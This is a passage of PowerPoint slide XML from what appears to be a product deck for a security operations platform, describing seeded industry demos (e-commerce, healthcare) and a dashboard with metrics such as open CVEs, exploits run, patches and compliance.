          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MinIO · PostgreSQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="3493008"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis · Product API</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="3730752"/>
            <a:ext cx="266090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0" y="3813048"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  E-commerce with search &amp; object storage</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4050792"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Inventory &amp; payment gateway</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4288536"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  GDPR &amp; PCI-DSS applicable</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4526280"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Elasticsearch injection CVEs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="1847088"/>
            <a:ext cx="2880360" cy="4370832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="635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0" y="1938528"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🏥</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="2514600"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="A78BFA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MediCore
Health</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9253728" y="3090672"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OpenEMR · FHIR API</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9253728" y="3291840"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patient Portal</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9253728" y="3493008"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DICOM · Keycloak</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Rectangle 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9253728" y="3730752"/>
            <a:ext cx="266090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81160" y="3813048"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Electronic health records &amp; FHIR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9281160" y="4050792"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Patient portal &amp; DICOM imaging</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9281160" y="4288536"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  HIPAA &amp; ISO 27001 focus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9281160" y="4526280"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Keycloak IAM with known CVEs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6291072"/>
            <a:ext cx="11731752" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Each industry demo seeds 10–15 assets · 12+ real CVEs · exploit simulation history · compliance controls · patch PRs · incident history · dark web findings — all consistent and cross-linked.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Dashboard</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The security operations command centre — every critical metric on one screen, live from Supabase</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Dashboard is the first page analysts see after selecting an industry. It is designed as a single pane of glass that aggregates live data from every other module into one coherent view. Rather than navigating between pages to understand the overall security posture, the Dashboard surfaces the most important signals: how many critical vulnerabilities are open, how recent exploit simulations performed, what the compliance posture looks like, and which integrations are syncing correctly. The page auto-refreshes and shows a live activity feed so the SOC team always has situational awareness without manual effort.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2084831"/>
            <a:ext cx="1920240" cy="822960"/>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084831"/>
            <a:ext cx="192024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176271"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security Score</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2359151"/>
            <a:ext cx="1700784" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>72</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2688335"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/100 weighted</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2203704" y="2084831"/>
            <a:ext cx="1920240" cy="82296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03704" y="2084831"/>
            <a:ext cx="192024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13432" y="2176271"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Open CVEs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2313432" y="2359151"/>
            <a:ext cx="1700784" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2313432" y="2688335"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5 are CRITICAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4178808" y="2084831"/>
            <a:ext cx="1920240" cy="822960"/>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78808" y="2084831"/>
            <a:ext cx="192024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8536" y="2176271"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Assets Monitored</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4288536" y="2359151"/>
            <a:ext cx="1700784" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4288536" y="2688335"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All services live</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="2084831"/>
            <a:ext cx="1920240" cy="82296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3912" y="2084831"/>
            <a:ext cx="192024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2176271"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploits Run</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="2359151"/>
            <a:ext cx="1700784" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="2688335"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4 confirmed exploited</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8129016" y="2084831"/>
            <a:ext cx="1920240" cy="82296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29016" y="2084831"/>
            <a:ext cx="192024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38744" y="2176271"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patches Ready</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8238744" y="2359151"/>
            <a:ext cx="1700784" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8238744" y="2688335"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2 already merged</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10104120" y="2084831"/>
            <a:ext cx="1920240" cy="822960"/>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104120" y="2084831"/>
            <a:ext cx="192024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13848" y="2176271"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Avg Compliance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10213848" y="2359151"/>
            <a:ext cx="1700784" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>67%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10213848" y="2688335"/>
            <a:ext cx="1700784" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ISO+SOC2+PCI avg</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
